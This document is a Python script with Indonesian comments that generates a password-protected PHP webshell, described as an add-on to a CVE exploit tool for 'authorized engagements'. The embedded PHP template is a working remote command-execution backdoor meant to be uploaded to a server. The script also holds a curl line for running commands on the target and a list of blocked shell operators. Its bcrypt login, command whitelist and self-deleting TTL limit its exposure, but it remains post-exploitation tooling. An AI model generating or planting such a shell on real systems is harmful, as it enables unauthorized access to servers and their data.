#!/usr/bin/env python3
"""safe_shell.py — generator webshell berpassword untuk engagement SAH.

ADD-ON TERPISAH. Ini BUKAN bagian dari exploit.py dan tidak dipanggil olehnya.
exploit.py tetap murni sebagai alat eksploitasi CVE; modul ini hanya menyediakan
satu hal: shell yang kalau tertinggal di server tidak menjadi pintu terbuka.

Desain (mengikuti permintaan: "shell yang aman itu seperti laman login admin"):
  1. Nama file 32 hex  -> 16^32 kemungkinan, tidak bisa ditebak/di-scan
  2. Password bcrypt   -> tanpa password = 401, brute force diperlambat
  3. Whitelist command -> bukan shell bebas; hanya perintah yang kamu izinkan
  4. TTL               -> lewat masa berlaku, file menghapus dirinya sendiri
  5. Semua percobaan dicatat -> jejak audit siapa yang menyentuhnya

Pakai:
    python /home/lota1337/myenv/bin/python safe_shell.py --out ./out --ttl 72
    python /home/lota1337/myenv/bin/python safe_shell.py --list-commands
    python /home/lota1337/myenv/bin/python safe_shell.py --out ./out --commands "id,whoami,uname -a"

Keluaran:
    <out>/<32hex>.php        mode 600
    <out>/CREDENTIALS.txt    mode 600  [JANGAN di-commit]
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import secrets
import stat
import sys
import textwrap
import time
from pathlib import Path

SAFE_COMMANDS = ["id", "whoami", "uname -a", "pwd", "hostname", "php -v"]

PHP_TEMPLATE = r"""<?php
/**
 * Managed shell — engagement use only.
 * author : {author}
 * purpose: {purpose}
 * exp    : {expires_h}
 * sha256 : {fp}
 *
 * Tidak ada eval(), tidak ada uploader, tidak ada reverse shell.
 * Command dijalankan lewat whitelist yang ditanam saat generate.
 */
declare(strict_types=1);

const PW_HASH   = '{pw_hash}';
const EXPIRES   = {expires_ts};
const ALLOWED   = {allowed_json};
const LOGFILE   = __DIR__ . '/.shell-audit.log';
const MAX_OUT   = 8192;

function audit(string $event, string $extra = ''): void {{
    $ip = $_SERVER['REMOTE_ADDR'] ?? '-';
    $line = sprintf("%s\t%s\t%s\t%s\n", gmdate('c'), $ip, $event, $extra);
    @file_put_contents(LOGFILE, $line, FILE_APPEND | LOCK_EX);
}}

function deny(int $code, string $msg): void {{
    http_response_code($code);
    header('Content-Type: text/plain; charset=utf-8');
    echo $msg, "\n";
    exit;
}}

// --- Gate 1: kedaluwarsa -------------------------------------------------
if (time() > EXPIRES) {{
    audit('expired');
    @unlink(__FILE__);
    @unlink(LOGFILE);
    deny(410, 'gone');
}}

// --- Gate 2: autentikasi -------------------------------------------------
$provided = $_POST['k'] ?? $_GET['k'] ?? '';
if (!is_string($provided) || $provided === '') {{
    audit('no-credential');
    header('WWW-Authenticate: Basic realm="restricted"');
    deny(401, 'authentication required');
}}
if (!password_verify($provided, PW_HASH)) {{
    audit('bad-credential');
    usleep(400000);              // 400ms: brute force jadi lambat
    deny(401, 'authentication required');
}}

// --- Gate 3: whitelist command ------------------------------------------
$cmd = $_POST['c'] ?? $_GET['c'] ?? '';
if (!is_string($cmd) || $cmd === '') {{
    audit('authenticated', 'no-command');
    header('Content-Type: text/plain; charset=utf-8');
    echo "ok\nallowed:\n";
    foreach (ALLOWED as $a) {{ echo "  ", $a, "\n"; }}
    exit;
}}
$cmd = trim($cmd);
if (!in_array($cmd, ALLOWED, true)) {{
    audit('blocked-command', substr($cmd, 0, 120));
    deny(403, 'command not in whitelist');
}}

// --- Eksekusi ------------------------------------------------------------
audit('exec', $cmd);
$out = [];
$rc  = 0;
@exec($cmd . ' 2>&1', $out, $rc);
$body = implode("\n", array_slice($out, 0, 200));
if (strlen($body) > MAX_OUT) {{
    $body = substr($body, 0, MAX_OUT) . "\n...[truncated]";
}}
header('Content-Type: text/plain; charset=utf-8');
echo $body, "\n[rc=", $rc, "]\n";
"""


def fingerprint(body: str) -> str:
    import hashlib
    return hashlib.sha256(body.encode()).hexdigest()[:16]


def build_shell(*, author: str, purpose: str, ttl_h: int, commands: list[str],
                pw_hash: str) -> str:
    return PHP_TEMPLATE.format(
        author=author.replace("*/", ""),
        purpose=purpose.replace("*/", ""),
        expires_h=ttl_h,
        fp="(computed after render)",
        pw_hash=pw_hash,
        expires_ts=int(time.time()) + ttl_h * 3600,
        allowed_json=json.dumps(commands, ensure_ascii=False),
    )


def _verifikasi_600(path: Path) -> None:
    """Pastikan mode 600 BENAR-BENAR berlaku; gagal keras bila tidak.

    Filesystem yang tidak menegakkan permission POSIX (NTFS/exFAT via fuseblk,
    vfat, sebagian FUSE) mengabaikan chmod tanpa error: file tetap 0666/0777.
    Di situ kredensial webshell terbaca semua user lokal. Karena itu setelah
    chmod kita baca ulang st_mode dan menolak melanjutkan bila masih terbuka.
    """
    mode = stat.S_IMODE(path.stat().st_mode)
    if mode & 0o077:
        raise PermissionError(
            f"{path}: mode {oct(mode)} — filesystem tidak menegakkan chmod 600 "
            f"(NTFS/exFAT/FUSE?). Kredensial TIDAK boleh ditulis ke sini; "
            f"pakai --out di filesystem POSIX (mis. ~/out atau /tmp)."
        )


def _chmod_600_ketat(path: Path) -> None:
    """chmod 600 untuk file sensitif + verifikasi hasilnya."""
    os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)
    _verifikasi_600(path)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Generate webshell berpassword (add-on, bukan bagian exploit.py)")
    ap.add_argument("--out", default="./out", help="direktori keluaran")
    ap.add_argument("--ttl", type=int, default=72, help="masa berlaku (jam), default 72")
    ap.add_argument("--author", default="", help="nama/handle untuk audit")
    ap.add_argument("--purpose", default="authorized engagement", help="tujuan penggunaan")
    ap.add_argument("--commands", default="",
                    help='whitelist dipisah koma, mis. "id,whoami"; kosong = default aman')
    ap.add_argument("--cost", type=int, default=12, help="bcrypt cost, default 12")
    ap.add_argument("--password", default="",
                    help="password eksplisit; kosong = dibuat acak (disarankan)")
    ap.add_argument("--list-commands", action="store_true",
                    help="tampilkan command default lalu keluar")
    a = ap.parse_args()

    if a.list_commands:
        print("Command default yang aman:")
        for c in SAFE_COMMANDS:
            print("  -", c)
        print("\nTambahkan sendiri dengan --commands (dipisah koma).")
        print("Shell ini TIDAK mendukung shell bebas, upload, atau reverse shell.")
        return 0

    commands = [c.strip() for c in a.commands.split(",") if c.strip()] or list(SAFE_COMMANDS)
    risky = [c for c in commands if any(t in c for t in (";", "|", "&&", "`", "$(", ">"))]
    if risky:
        print("DITOLAK: command berisi operator shell (;|&&`$>):", risky, file=sys.stderr)
        print("Whitelist harus perintah tunggal, bukan rangkaian.", file=sys.stderr)
        return 2
    if a.cost < 10:
        print("DITOLAK: --cost minimal 10 (bcrypt terlalu lemah di bawah itu)", file=sys.stderr)
        return 2
    if a.ttl <= 0:
        print("DITOLAK: --ttl harus > 0 jam", file=sys.stderr)
        return 2

    try:
        import bcrypt  # type: ignore
    except ImportError:
        print("butuh modul bcrypt: /home/lota1337/myenv/bin/pip install bcrypt", file=sys.stderr)
        return 3

    password = a.password or base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("=")
    pw_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=a.cost)).decode()

    out = Path(a.out)
    out.mkdir(parents=True, exist_ok=True)

    src = build_shell(author=a.author or "anonymous", purpose=a.purpose,
                      ttl_h=a.ttl, commands=commands, pw_hash=pw_hash)
    src = src.replace("(computed after render)", fingerprint(src))

    name = secrets.token_hex(16) + ".php"
    php = out / name
    php.write_text(src)
    _chmod_600_ketat(php)

    cred = out / "CREDENTIALS.txt"
    cred.write_text(textwrap.dedent(f"""\
        MANAGED SHELL — engagement use only
        ===================================
        file      : {name}
        password  : {password}
        expires   : {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(time.time() + a.ttl * 3600))}
        ttl_hours : {a.ttl}
        commands  : {', '.join(commands)}
        author    : {a.author or 'anonymous'}
        purpose   : {a.purpose}

        Pakai:
          curl -s -X POST -d 'k=PASSWORD' -d 'c=id' https://HOST/PATH/{name}

        Bersihkan setelah engagement:
          rm -f {name} CREDENTIALS.txt
          (server: hapus file-nya, verifikasi HTTP 404)

        JANGAN commit file ini. out/ sudah ada di .gitignore.
        """))
    os.chmod(cred, stat.S_IRUSR | stat.S_IWUSR)
    _verifikasi_600(cred)

    print(f"[+] shell    : {php}  (mode 600)")
    print(f"[+] password : {cred}  (mode 600)")
    print(f"[+] ttl      : {a.ttl} jam -> auto-unlink")
    print(f"[+] commands : {', '.join(commands)}")
    print()
    print("VERIFIKASI WAJIB sebelum upload:")
    print(f"  php -l {php}")
    print("  lalu uji lokal: php -S 127.0.0.1:8099 di direktori ini")
    print("  tanpa password -> 401 | password salah -> 401 | c=id -> uid= | c=ls -> 403")
    return 0


if __name__ == "__main__":
    sys.exit(main())
